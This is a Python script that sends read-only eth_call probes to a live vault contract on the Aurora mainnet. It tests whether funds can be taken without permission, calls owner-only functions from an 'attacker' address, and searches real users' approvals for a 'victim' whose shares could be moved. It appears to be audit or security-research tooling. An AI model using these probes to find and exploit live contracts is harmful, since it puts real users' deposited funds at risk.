#!/usr/bin/env python3
"""Child1: permissionless-path probes against the live VASE. All read-only eth_call at one block."""
import json, urllib.request, time
from Crypto.Hash import keccak

RPC = "https://mainnet.aurora.dev"
VASE = "0xee793001Ce9Fa988712B15a59CCf5dC7d54b22FF"
GARDEN_MASTER = "0x857050Ef3a0241a2c1f65ca1F0c100a04E4AEd93"
GARDEN_USDC = "0xfbAF3eBF228eB712b1267285787e51aDd70086bB"
ZERO = "0x" + "0" * 40
DEAD = "0x000000000000000000000000000000000000dEaD"
TOKENS = {
    "USDC.e": "0xb12bfca5a55806aaf64e99521918a4bf0fc40802",
    "USDT.e": "0x4988a896b1227218e4a686fde5eabdcabd91571f",
    "WNEAR":  "0xc42c30ac6cc15fac9bd938618bcaa1a1fae8501d",
    "WETH":   "0xc9bdeed33cd01541e1eed10f90519d2c06fe3feb",
    "WBTC":   "0xf4eb217ba2454613b15dbdea6e5f22276410e89e",
    "UST":    "0x5ce9f0b6afb36135b5ddbf11705ceb65e634a9dc",
    "RUSD":   "0x19cc40283b057d6608c22f1d20f17e16c245642e",
}

def rpc_batch(items, retries=4, chunk=10):
    out = []
    for i in range(0, len(items), chunk):
        part = items[i:i+chunk]
        payload = [{"jsonrpc": "2.0", "id": j, "method": m, "params": p} for j, (m, p) in enumerate(part)]
        got = None
        for att in range(retries):
            try:
                req = urllib.request.Request(RPC, data=json.dumps(payload).encode(),
                                             headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                r = json.load(urllib.request.urlopen(req, timeout=60))
                got = {x["id"]: x for x in r}
                break
            except Exception:
                time.sleep(2)
        if got is None:
            out.extend([{"error": "rpc-failed"}] * len(part))
        else:
            out.extend(got.get(j, {"error": "missing"}) for j in range(len(part)))
        time.sleep(0.15)
    return out

def keccak256(b):
    h = keccak.new(digest_bits=256); h.update(b)
    return h.hexdigest()

def pad(s):
    return s.lower()[2:].rjust(64, "0")

def decode_revert(hexdata):
    if not hexdata or hexdata == "0x":
        return None
    try:
        b = bytes.fromhex(hexdata[2:])
    except ValueError:
        return None
    if len(b) >= 4 + 32 and b[:4].hex() == "08c379a0":
        off = int.from_bytes(b[4:36], "big")
        if len(b) >= 4 + off + 32:
            ln = int.from_bytes(b[4 + off:36 + off], "big")
            return b[36 + off:36 + off + ln].decode("utf8", "replace")
    return None

def probe(blk_hex, to, data, frm=None):
    tx = {"to": to, "data": data}
    if frm:
        tx["from"] = frm
    return ("eth_call", [tx, blk_hex])

def main():
    blk = int(rpc_batch([("eth_blockNumber", [])])[0]["result"], 16)
    blkh = hex(blk)
    print("Aurora block:", blk)
    tests = []
    # 1) skim probe: deposit(from=VASE) for 1 wei of each token
    for lab, tok in TOKENS.items():
        tests.append((f"skim_deposit_1wei[{lab}]", probe(blkh, VASE,
            "0x02b9446c" + pad(tok) + pad(VASE) + pad(DEAD) + format(1, "064x") + format(0, "064x"))))
    # 2) withdraw from vault
    for lab, tok in TOKENS.items():
        tests.append((f"withdraw_from_vault_1[{lab}]", probe(blkh, VASE,
            "0x97da6d30" + pad(tok) + pad(VASE) + pad(DEAD) + format(1, "064x") + format(0, "064x"))))
    # 3) transfer from vault
    for lab, tok in list(TOKENS.items())[:4]:
        tests.append((f"transfer_from_vault_1[{lab}]", probe(blkh, VASE,
            "0xf18d03cc" + pad(tok) + pad(VASE) + pad(DEAD) + format(1, "064x"))))
    # 3b) share-based deposit skim and transferMultiple from vault
    for lab, tok in TOKENS.items():
        tests.append((f"skim_deposit_share1[{lab}]", probe(blkh, VASE,
            "0x02b9446c" + pad(tok) + pad(VASE) + pad(DEAD) + format(0, "064x") + format(1, "064x"))))
    for lab, tok in list(TOKENS.items())[:2]:
        tests.append((f"transferMultiple_from_vault[{lab}]", probe(blkh, VASE,
            "0x0fca8843" + pad(tok) + pad(VASE) + format(64, "064x") + format(1, "064x") +
            pad(DEAD) + format(1, "064x"))))
    # 4) harvest with no strategy
    for lab, tok in list(TOKENS.items())[:2]:
        tests.append((f"harvest_no_strategy[{lab}]", probe(blkh, VASE,
            "0x66c6bb0b" + pad(tok) + format(0, "064x") + format(0, "064x"))))
    # 5) privileged functions from attacker EOA
    attacker = "0x5eed000000000000000000000000000000005eed"
    tests.append(("claimOwnership", probe(blkh, VASE, "0x4e71e0c8", attacker)))
    tests.append(("whitelistMasterContract", probe(blkh, VASE,
        "0x733a9d7c" + pad(attacker) + format(1, "064x"), attacker)))
    tests.append(("setStrategyTargetPercentage", probe(blkh, VASE,
        "0x3e2a9d4e" + pad(TOKENS["USDC.e"]) + format(95, "064x"), attacker)))
    tests.append(("setStrategy", probe(blkh, VASE,
        "0x72cb5d97" + pad(TOKENS["USDC.e"]) + pad(attacker), attacker)))
    tests.append(("transferOwnership_renounce", probe(blkh, VASE,
        "0x078dfbe7" + pad(attacker) + format(0, "064x") + format(1, "064x"), attacker)))
    tests.append(("registerProtocol", probe(blkh, VASE, "0xaee4d1b2", attacker)))
    # 6) find a victim with approvals & shares (scan all approvers x 7 tokens), then simulate
    #    garden-clone vs EOA transfer of the victim's shares (documents the approval surface)
    try:
        st = json.load(open("child1_state.json"))
        approvals = list(st.get("approvals_gardenMaster", {}).keys())
    except Exception:
        approvals = []
    if not approvals:
        approvals = ["0x0025500c6a6bcaebde159db6a307f4d38503a079"]
    victim = DEAD
    victim_token = None
    balance_probes = []
    for usr in approvals:
        for lab, tok in TOKENS.items():
            balance_probes.append((f"vbal[{lab}][{usr}]", probe(blkh, VASE,
                "0xf7888aec" + pad(tok) + pad(usr))))
    res = rpc_batch([it[1] for it in balance_probes])
    found = []
    for (lab, _), r in zip(balance_probes, res):
        v = r.get("result")
        if isinstance(v, str) and v not in ("0x", None) and int(v, 16) > 0:
            found.append((lab, int(v, 16)))
    print("approvers with direct VASE shares:", found[:10])
    if found:
        lab = found[0][0].split("[")[1].split("]")[0]
        victim = found[0][0].rsplit("[", 1)[1].rstrip("]")
        victim_token = TOKENS[lab]
        tests.append(("transfer_victim_from_attacker_eoa", probe(blkh, VASE,
            "0xf18d03cc" + pad(victim_token) + pad(victim) + pad(DEAD) + format(1, "064x"), attacker)))
        tests.append(("transfer_victim_from_garden_clone", probe(blkh, VASE,
            "0xf18d03cc" + pad(victim_token) + pad(victim) + pad(DEAD) + format(1, "064x"), GARDEN_USDC)))

    items = [t[1] for t in tests]
    res = rpc_batch(items)
    out = {"block": blk, "results": {}}
    for (label, _), r in zip(tests, res):
        entry = {"result": r.get("result"), "error": r.get("error")}
        if "error" in r and isinstance(r["error"], dict):
            entry["revert_data"] = r["error"].get("data")
            entry["message"] = r["error"].get("message")
            entry["revert_reason"] = decode_revert(r["error"].get("data")) if isinstance(r["error"].get("data"), str) else None
        out["results"][label] = entry
    json.dump(out, open("child1_paths.json", "w"), indent=1)

    print("\n===== probe results =====")
    for label, entry in out["results"].items():
        if entry.get("result") is not None and entry["result"] != "0x":
            short = entry["result"][:20]
            print(f"  {label:45s} OK  result={short}")
        else:
            rr = entry.get("revert_reason")
            print(f"  {label:45s} revert={rr!r}")

    # 7) DOMAIN_SEPARATOR verification
    ds = None
    r = rpc_batch([probe(blkh, VASE, "0x3644e515")])[0]
    if r.get("result"):
        ds = r["result"]
    chainid = 1313161554
    base = keccak256(b"EIP712Domain(string name,uint256 chainId,address verifyingContract)")
    for name in ("BentoBox V1", "Vase", "Vase V1"):
        enc = (base + keccak256(name.encode()) +
               format(chainid, "064x") + VASE.lower()[2:].rjust(64, "0"))
        computed = "0x" + keccak256(bytes.fromhex(enc))
        print(f"DOMAIN_SEPARATOR name={name!r}: computed={computed} live={ds} match={computed == ds}")
        out["domain_separator"] = {"live": ds, "name": name, "computed": computed, "match": computed == ds}
    json.dump(out, open("child1_paths.json", "w"), indent=1)

if __name__ == "__main__":
    main()
